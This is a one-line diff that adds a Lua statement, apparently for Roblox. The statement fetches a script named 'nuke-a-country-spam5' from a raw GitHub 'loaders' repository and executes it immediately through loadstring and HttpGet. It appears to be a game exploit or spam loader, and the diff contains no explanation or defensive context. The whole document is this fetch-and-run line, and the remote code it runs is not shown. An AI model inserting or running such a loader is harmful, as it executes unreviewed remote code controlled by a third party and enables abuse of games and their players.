@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/nuke-a-country-spam5-uo2cjujkhz7a6o.lua"))()
